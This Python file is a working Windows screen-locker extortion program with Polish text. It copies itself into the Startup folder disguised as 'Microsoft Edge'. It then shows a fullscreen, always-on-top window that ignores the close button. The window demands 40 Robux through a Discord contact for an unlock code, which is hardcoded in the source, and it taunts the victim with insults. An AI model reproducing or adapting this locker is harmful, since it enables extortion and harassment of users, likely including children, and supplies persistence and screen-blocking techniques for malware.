import tkinter as tk
from tkinter import messagebox
import re
import os
import sys
import pythoncom
import threading
import time
from win32com.shell import shell

CORRECT_CODE = "NEVER_OPEN_THIS_AGAIN_BITCH"

def add_to_autostart(name="Microsoft Edge"):
    startup_folder = os.path.join(
        os.getenv("APPDATA"),
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    script_path = os.path.abspath(sys.argv[0])
    shortcut_path = os.path.join(startup_folder, f"{name}.lnk")

    shell_link = pythoncom.CoCreateInstance(
        shell.CLSID_ShellLink, None,
        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
    )

    shell_link.SetPath(script_path)
    shell_link.SetWorkingDirectory(os.path.dirname(script_path))

    persist_file = shell_link.QueryInterface(pythoncom.IID_IPersistFile)
    persist_file.Save(shortcut_path, 0)

    print("Dodano do autostartu!")

if __name__ == "__main__":
    add_to_autostart("Microsoft Edge")

def blokada_zamykania():
    pass  # nic nie rób, okno się nie zamknie

def check_code():
    code = entry.get().strip()
    if code == CORRECT_CODE:
        messagebox.showinfo("Odblokowano", "Kod jest poprawny — program zakończy działanie.\nPamiętaj aby usunąć go z autostartu szmato 🤣\n I dziena za 40 Robux lol 😈")
        root.destroy()
    else:
        messagebox.showerror("Błąd", "Nieprawidłowy kod. Spróbuj ponownie.")
        entry.delete(0, tk.END)
        entry.focus_set()

root = tk.Tk()
root.title("Oops! Twój komputer został zablokowany!")
root.configure(bg="black")
root.protocol("WM_DELETE_WINDOW", blokada_zamykania)
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)

frame = tk.Frame(root, bg="black", padx=40, pady=40)
frame.pack(expand=True, fill="both")

# TWÓJ TEKST
text_content = """
Oops! Twój komputer został zablokowany!

Aby dostać klucz <<odblokowywujący>><<,>> napisz na Discord do użytkownika <<nowak122>> oraz
wykup go za 40 Robux<<.>>

Następnie wpisz kod <<odblokowywujący>> otrzymany w wiadomości<<,>> wpisz go
w pole kodu i wciśnij przycisk <<"Odblokuj">>

<<WAŻNE>>:
- Możesz próbować wpisać kod dowolną liczbę razy<<.>>
- Jeśli wpiszesz niepoprawny kod<<,>> pojawi się komunikat i będziesz
  mógł spróbować ponownie<<.>>
- Po wpisaniu poprawnego kodu program się wyłączy i to okno zniknie.
- Program jest <<stale>> włączony dopóki nie wpiszesz poprawnego kodu<<.>>

Jeśli masz pytania lub problemy, skontaktuj się z użytkownikiem <<nowak112>>
na platformie Discord<<.>>

Stworzone przez nowak122 inaczej KacperBlaze.
Nie próbuj wciskać ALT+F4 ani WIN+R... Nic z tego
nie działa 🤣
"""

# WIDGET TEKSTOWY (tylko do wyświetlania)
text_widget = tk.Text(
    frame,
    bg="black",
    fg="red",
    font=("Helvetica", 16),
    wrap="word",
    relief="flat",
    borderwidth=0,
    highlightthickness=0
)
text_widget.pack(pady=(0,20), expand=True, fill="both")

# TAGI FORMATOWANIA
text_widget.tag_configure("bold", font=("Helvetica", 16, "bold"), foreground="red")
text_widget.tag_configure("center", justify="center")

# WSTAWIAMY TEKST Z ANALIZĄ << >>
parts = re.split(r"(<<.*?>>)", text_content)

for part in parts:
    if part.startswith("<<") and part.endswith(">>"):
        content = part[2:-2]
        text_widget.insert("end", content, ("bold", "center"))
    else:
        text_widget.insert("end", part, "center")

text_widget.configure(state="disabled")  # tylko do odczytu

# POLE KODU
entry_frame = tk.Frame(frame, bg="black")
entry_frame.pack(pady=(0,10))

entry = tk.Entry(
    entry_frame,
    fg="red",
    bg="black",
    insertbackground="red",
    font=("Consolas", 14),
    width=30,
    justify="center"
)
entry.pack(side="left", padx=(0,10))
entry.focus_set()

unlock_btn = tk.Button(
    entry_frame,
    text="Odblokuj",
    command=check_code,
    font=("Helvetica", 12, "bold"),
    padx=10,
    pady=5
)
unlock_btn.pack(side="left")

root.bind("<Return>", lambda e: check_code())

# Maksymalizacja okna
try:
    root.state('zoomed')
except:
    root.attributes('-zoomed', True)

root.mainloop()
